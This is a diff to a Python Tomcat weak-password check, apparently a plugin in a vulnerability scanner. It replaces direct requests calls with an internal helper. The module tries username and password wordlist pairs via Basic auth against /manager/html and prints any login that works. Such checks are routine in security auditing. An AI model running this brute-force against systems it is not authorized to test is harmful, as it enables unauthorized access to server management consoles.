@@ -7,9 +7,7 @@ description: Tomcat 弱口令漏洞
 
 import json
 import base64
-import requests
-import requests.packages.urllib3
-requests.packages.urllib3.disable_warnings()
+from app.lib.utils.request import request
 
 class Tomcat_Weakpwd_BaseVerify:
     def __init__(self, url):
@@ -23,7 +21,7 @@ class Tomcat_Weakpwd_BaseVerify:
         if not self.url.startswith("http") and not self.url.startswith("https"):
             self.url = "http://" + self.url
         try:
-            check_req = requests.get(self.url, headers = self.headers, allow_redirects = False, verify = False)
+            check_req = request.get(self.url, headers = self.headers)
             if "installed Tomcat. Congratulations!" in check_req.text:
                 for user in open('app/username.txt', 'r', encoding = 'utf-8').readlines():
                     user = user.strip()
@@ -32,7 +30,7 @@ class Tomcat_Weakpwd_BaseVerify:
                             pwd = pwd.strip()
                         author = ("%s:%s") % (user, pwd)
                         self.headers["Authorization"] = "Basic " + base64.b64encode(author.encode('utf-8')).decode('utf-8')
-                        result_req = requests.get(self.url + '/manager/html', headers = self.headers, allow_redirects = False, verify = False)
+                        result_req = request.get(self.url + '/manager/html', headers = self.headers)
                         if "Tomcat Web Application Manager" in result_req.text:
                             print('存在Tomcat 弱口令漏洞,账号密码为:', user, pwd)
                             return True
